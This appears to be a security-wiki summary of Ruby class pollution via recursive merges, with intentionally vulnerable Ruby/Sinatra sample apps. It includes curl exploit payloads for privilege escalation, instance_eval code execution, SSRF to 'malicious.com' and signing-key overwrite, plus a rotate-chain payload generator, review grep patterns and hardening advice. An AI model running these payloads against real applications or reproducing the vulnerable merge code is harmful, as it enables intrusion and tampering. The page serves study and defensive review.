# Ruby Class Pollution

{{#include ../../banners/hacktricks-training.md}}

This is a summary from the post [https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html](https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html)<sup>[[1]](#references)</sup>

## When a recursive merge becomes class pollution

A normal hash-to-hash `deep_merge` is not enough. The dangerous pattern is a recursive importer that treats untrusted keys as object attributes, dynamically creates readers/writers, or invokes a same-named method to obtain the next merge target. In the example below, a nested hash key reaches `respond_to?`/`public_send`, so keys such as `class`, `superclass` and `subclasses` become **zero-argument method calls** rather than data keys. A scalar leaf then reaches `instance_variable_set` and `singleton_class.attr_accessor`, giving the attacker a write primitive on the object reached by that method chain.<sup>[[1]](#references)</sup>

This distinction is useful during review:<sup>[[1]](#references)</sup>

- **Instance pollution:** a leaf overwrites a reader only on one object's singleton class. It can still bypass authorization or become RCE when the value later reaches `instance_eval`, `eval`, `send`, a template, or another dangerous sink.
- **Class-object pollution:** traversal reaches a `Class` object and installs an instance variable plus a singleton accessor on that class object. The new class method can shadow an existing reader and remains visible to all requests handled by that Ruby process.<sup>[[1]](#references)</sup>

## Merge on Attributes

Example:

```ruby
# Code from https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html
# Comments added to exploit the merge on attributes
require 'json'


# Base class for both Admin and Regular users
class Person

  attr_accessor :name, :age, :details

  def initialize(name:, age:, details:)
    @name = name
    @age = age
    @details = details
  end

  # Method to merge additional data into the object
  def merge_with(additional)
    recursive_merge(self, additional)
  end

  # Authorize based on the `to_s` method result
  def authorize
    if to_s == "Admin"
      puts "Access granted: #{@name} is an admin."
    else
      puts "Access denied: #{@name} is not an admin."
    end
  end

  # Health check that executes all protected methods using `instance_eval`
  def health_check
    protected_methods().each do |method|
      instance_eval(method.to_s)
    end
  end

  private

  # VULNERABLE FUNCTION that can be abused to merge attributes
  def recursive_merge(original, additional, current_obj = original)
    additional.each do |key, value|

      if value.is_a?(Hash)
        if current_obj.respond_to?(key)
          next_obj = current_obj.public_send(key)
          recursive_merge(original, value, next_obj)
        else
          new_object = Object.new
          current_obj.instance_variable_set("@#{key}", new_object)
          current_obj.singleton_class.attr_accessor key
        end
      else
        current_obj.instance_variable_set("@#{key}", value)
        current_obj.singleton_class.attr_accessor key
      end
    end
    original
  end

  protected

  def check_cpu
    puts "CPU check passed."
  end

  def check_memory
    puts "Memory check passed."
  end
end

# Admin class inherits from Person
class Admin < Person
  def initialize(name:, age:, details:)
    super(name: name, age: age, details: details)
  end

  def to_s
    "Admin"
  end
end

# Regular user class inherits from Person
class User < Person
  def initialize(name:, age:, details:)
    super(name: name, age: age, details: details)
  end

  def to_s
    "User"
  end
end

class JSONMergerApp
  def self.run(json_input)
    additional_object = JSON.parse(json_input)

    # Instantiate a regular user
    user = User.new(
      name: "John Doe",
      age: 30,
      details: {
        "occupation" => "Engineer",
        "location" => {
          "city" => "Madrid",
          "country" => "Spain"
        }
      }
    )


    # Perform a recursive merge, which could override methods
    user.merge_with(additional_object)

    # Authorize the user (privilege escalation vulnerability)
    # ruby class_pollution.rb '{"to_s":"Admin","name":"Jane Doe","details":{"location":{"city":"Barcelona"}}}'
    user.authorize

    # Execute health check (RCE vulnerability)
    # ruby class_pollution.rb '{"protected_methods":["puts 1"],"name":"Jane Doe","details":{"location":{"city":"Barcelona"}}}'
    user.health_check

  end
end

if ARGV.length != 1
  puts "Usage: ruby class_pollution.rb 'JSON_STRING'"
  exit
end

json_input = ARGV[0]
JSONMergerApp.run(json_input)
```

### Explanation

1. **Privilege Escalation**: The `authorize` method checks if `to_s` returns "Admin." By injecting a new `to_s` attribute through JSON, an attacker can make the `to_s` method return "Admin," granting unauthorized privileges.
2. **Remote Code Execution**: In `health_check`, `instance_eval` executes methods listed in `protected_methods`. If an attacker injects custom method names (like `"puts 1"`), `instance_eval` will execute it, leading to **remote code execution (RCE)**.
   1. This is only possible because there is a **vulnerable `eval` instruction** executing the string value of that attribute.
3. **Impact Limitation**: This vulnerability only affects individual instances, leaving other instances of `User` and `Admin` unaffected, thus limiting the scope of exploitation.

### Real-World Cases <a href="#real-world-cases" id="real-world-cases"></a>

### ActiveSupport’s `deep_merge`

`Hash#deep_merge` is not vulnerable by itself because it only merges hashes. It becomes dangerous when application code subsequently turns every merged key into an accessor or writes it into an object, as in the following pattern.<sup>[[1]](#references)</sup>

```ruby
# Method to merge additional data into the object using ActiveSupport deep_merge
def merge_with(other_object)
  merged_hash = to_h.deep_merge(other_object)

  merged_hash.each do |key, value|
    self.class.attr_accessor key
    instance_variable_set("@#{key}", value)
  end

  self
end
```

### Hashie’s `deep_merge`

Hashie’s `deep_merge` method operates directly on object attributes rather than plain hashes. It **prevents replacement of methods** with attributes during a merge, with some **exceptions**: attributes ending in `_`, `!`, or `?` can still be merged into the object.<sup>[[1]](#references)</sup>

A special case is the standalone **`_`** attribute, which normally returns a `Mash` object. Because it is one of the exceptions, an attacker can modify it.<sup>[[1]](#references)</sup>

The following example shows how passing `{"_": "Admin"}` can satisfy the `_.to_s == "Admin"` authorization check:

```ruby
require 'json'
require 'hashie'

# Base class for both Admin and Regular users
class Person < Hashie::Mash

  # Method to merge additional data into the object using hashie
  def merge_with(other_object)
    deep_merge!(other_object)
    self
  end

  # Authorize based on to_s
  def authorize
    if _.to_s == "Admin"
      puts "Access granted: #{@name} is an admin."
    else
      puts "Access denied: #{@name} is not an admin."
    end
  end

end

# Admin class inherits from Person
class Admin < Person
  def to_s
    "Admin"
  end
end

# Regular user class inherits from Person
class User < Person
  def to_s
    "User"
  end
end

class JSONMergerApp
  def self.run(json_input)
    additional_object = JSON.parse(json_input)

    # Instantiate a regular user
    user = User.new({
      name: "John Doe",
      age: 30,
      details: {
        "occupation" => "Engineer",
        "location" => {
          "city" => "Madrid",
          "country" => "Spain"
        }
      }
    })

    # Perform a deep merge, which could override methods
    user.merge_with(additional_object)

    # Authorize the user (privilege escalation vulnerability)
    # Exploit: If we pass {"_": "Admin"} in the JSON, the user will be treated as an admin.
    # Example usage: ruby hashie.rb '{"_": "Admin", "name":"Jane Doe","details":{"location":{"city":"Barcelona"}}}'
    user.authorize
  end
end

if ARGV.length != 1
  puts "Usage: ruby hashie.rb 'JSON_STRING'"
  exit
end

json_input = ARGV[0]
JSONMergerApp.run(json_input)
```

## Poison the Classes <a href="#escaping-the-object-to-poison-the-class" id="escaping-the-object-to-poison-the-class"></a>

The following example defines **`Person`**, the **`Admin`** and **`Regular`** subclasses that inherit from it, and a separate **`KeySigner`** class:

```ruby
require 'json'
require 'sinatra/base'
require 'net/http'

# Base class for both Admin and Regular users
class Person
  @@url = "http://default-url.com"

  attr_accessor :name, :age, :details

  def initialize(name:, age:, details:)
    @name = name
    @age = age
    @details = details
  end

  def self.url
    @@url
  end

  # Method to merge additional data into the object
  def merge_with(additional)
    recursive_merge(self, additional)
  end

  private

  # Recursive merge to modify instance variables
  def recursive_merge(original, additional, current_obj = original)
    additional.each do |key, value|
      if value.is_a?(Hash)
        if current_obj.respond_to?(key)
          next_obj = current_obj.public_send(key)
          recursive_merge(original, value, next_obj)
        else
          new_object = Object.new
          current_obj.instance_variable_set("@#{key}", new_object)
          current_obj.singleton_class.attr_accessor key
        end
      else
        current_obj.instance_variable_set("@#{key}", value)
        current_obj.singleton_class.attr_accessor key
      end
    end
    original
  end
end

class User < Person
  def initialize(name:, age:, details:)
    super(name: name, age: age, details: details)
  end
end

# A class created to simulate signing with a key, to be infected with the third gadget
class KeySigner
  @@signing_key = "default-signing-key"

  def self.signing_key
    @@signing_key
  end

  def sign(signing_key, data)
    "#{data}-signed-with-#{signing_key}"
  end
end

class JSONMergerApp < Sinatra::Base
  # POST /merge - Infects class variables using JSON input
  post '/merge' do
    content_type :json
    json_input = JSON.parse(request.body.read)

    user = User.new(
      name: "John Doe",
      age: 30,
      details: {
        "occupation" => "Engineer",
        "location" => {
          "city" => "Madrid",
          "country" => "Spain"
        }
      }
    )

    user.merge_with(json_input)

    { status: 'merged' }.to_json
  end

  # GET /launch-curl-command - Activates the first gadget
  get '/launch-curl-command' do
    content_type :json

    # This gadget makes an HTTP request to the URL stored in the User class
    if Person.respond_to?(:url)
      url = Person.url
      response = Net::HTTP.get_response(URI(url))
      { status: 'HTTP request made', url: url, response_body: response.body }.to_json
    else
      { status: 'Failed to access URL variable' }.to_json
    end
  end

  # Curl command to infect User class URL:
  # curl -X POST -H "Content-Type: application/json" -d '{"class":{"superclass":{"url":"http://example.com"}}}' http://localhost:4567/merge

  # GET /sign_with_subclass_key - Signs data using the signing key stored in KeySigner
  get '/sign_with_subclass_key' do
    content_type :json

    # This gadget signs data using the signing key stored in KeySigner class
    signer = KeySigner.new
    signed_data = signer.sign(KeySigner.signing_key, "data-to-sign")

    { status: 'Data signed', signing_key: KeySigner.signing_key, signed_data: signed_data }.to_json
  end

  # Curl command to infect KeySigner signing key (run in a loop until successful):
  # for i in {1..1000}; do curl -X POST -H "Content-Type: application/json" -d '{"class":{"superclass":{"superclass":{"subclasses":{"sample":{"signing_key":"injected-signing-key"}}}}}}' http://localhost:4567/merge; done

  # GET /check-infected-vars - Check if all variables have been infected
  get '/check-infected-vars' do
    content_type :json

    {
      user_url: Person.url,
      signing_key: KeySigner.signing_key
    }.to_json
  end

  run! if app_file == $0
end
```

### Poison Parent Class

With this payload:

```bash
curl -X POST -H "Content-Type: application/json" -d '{"class":{"superclass":{"url":"http://malicious.com"}}}' http://localhost:4567/merge
```

The chain reaches the **`Person` class object**. In this exact PoC it does not alter `@@url`: the leaf branch sets `Person`'s `@url` and defines a singleton `url` accessor, shadowing the original `Person.url` reader that returned `@@url`. Callers nevertheless receive the attacker URL, and the change persists process-wide.<sup>[[1]](#references)</sup>

### **Poisoning Other Classes**

With this payload:

```bash
for i in {1..1000}; do curl -X POST -H "Content-Type: application/json" -d '{"class":{"superclass":{"superclass":{"subclasses":{"sample":{"signing_key":"injected-signing-key"}}}}}}' http://localhost:4567/merge --silent > /dev/null; done
```

It is possible to brute-force the loaded classes until `sample` returns **`KeySigner`**, after which the dynamically installed `signing_key` singleton accessor shadows the original class reader. This approach is noisy: failed guesses may add accessors to unrelated classes, trigger exceptions, or destabilize the worker.<sup>[[1]](#references)</sup>

### Deterministic traversal with `rotate` chains

The **rotate-chains** technique from bi0sCTF 2025 replaces random `sample` selection with nested zero-argument calls to `Array#rotate`, followed by `first`. If a subclasses array is `[A, B, C]`, the method chain `rotate.rotate.first` deterministically selects `C` for that particular array snapshot. Repeating the request with offsets `0..n-1` enumerates every direct subclass, and the same construction can be placed at each level of a deep Rails inheritance tree. The chain only works when every traversed object exposes the required zero-argument methods (in particular `subclasses`).<sup>[[2]](#references)</sup>

The following helper builds a selector for one level; wrap the terminal write from the deepest desired class back toward `Object` for multi-level traversal.<sup>[[2]](#references)</sup>

```ruby
require "json"

def select_child(offset, tail)
  node = {"first" => tail}
  offset.times { node = {"rotate" => node} }
  {"subclasses" => node}
end

walk = {"signing_key" => "injected-signing-key"}
walk = select_child(Integer(ARGV.fetch(0)), walk)
puts JSON.generate({"class" => {"superclass" => {"superclass" => walk}}})
```

For the sample application, enumerate offsets and observe the signing endpoint (or another side channel) to identify success.<sup>[[2]](#references)</sup>

```bash
for i in $(seq 0 300); do
  body="$(ruby rotate_payload.rb "$i")"
  curl -s -H 'Content-Type: application/json' -d "$body" http://localhost:4567/merge >/dev/null
  curl -s http://localhost:4567/sign_with_subclass_key | grep -q injected && break
done
```

`Class#subclasses` is populated by the classes loaded in the current worker, so offsets may change after lazy loading, reloads, deployments, or between processes. Generate every nested rotate chain against the **same worker** when possible, use an application-level oracle to detect the desired class, and expect one offset search per ambiguous subclass level. Unlike `sample`, this makes each selection reproducible for a stable array snapshot, but it does not eliminate side effects when a wrong candidate also accepts the remaining chain.<sup>[[2]](#references)</sup>

## Gadget hunting and source review

Pollution is a data-write primitive, not automatically RCE. After confirming a controllable leaf, trace every read of the shadowed method/attribute. High-value gadgets include HTTP client destinations (SSRF), signing/encryption material, authorization roles, SQL fragments, file paths, serializer choices, and values later passed to dynamic evaluation. The bi0sCTF chain, for example, used a polluted controller value to make an otherwise fixed SQL query attacker-controlled before chaining the result into a separate deserialization path.<sup>[[1]](#references)[[2]](#references)</sup>

Useful source-review seeds are:<sup>[[1]](#references)[[2]](#references)</sup>

```bash
grep -RInE 'respond_to\?\(.*key|public_send\(.*key|send\(.*key' .
grep -RInE 'instance_variable_set|singleton_class.*attr_accessor|class_eval|instance_eval' .
grep -RInE 'deep_merge!?|recursive_merge|Mash|OpenStruct' .
```

Confirm whether attacker-controlled **keys**, not only values, reach these calls. Also test nested objects: flat allowlists can miss that a key becomes a method call only after the merge has traversed into another object.<sup>[[1]](#references)[[2]](#references)</sup>

## Hardening

Keep untrusted input as plain hashes and copy only schema-allowlisted leaves into explicitly named setters. Do not derive accessor names or call `send`/`public_send` from input keys, and do not recurse into arbitrary return values merely because `respond_to?` is true. A denylist containing only `class`, `superclass` and `subclasses` is brittle because application/library methods can expose alternative paths; validate the complete key tree and reject unknown keys, excessive depth, and unexpected container types. If dynamic configuration is required, merge into a fresh hash and construct a typed object only after validation.<sup>[[1]](#references)[[2]](#references)</sup>



## References

- [1] [Class Pollution in Ruby: A Deep Dive into Exploiting Recursive Merges](https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html)
- [2] [SFS_V1 - bi0sCTF 2025](https://blog.bi0s.in/2025/09/01/Web/SFS_V1-bi0sCTF20252025/)
{{#include ../../banners/hacktricks-training.md}}
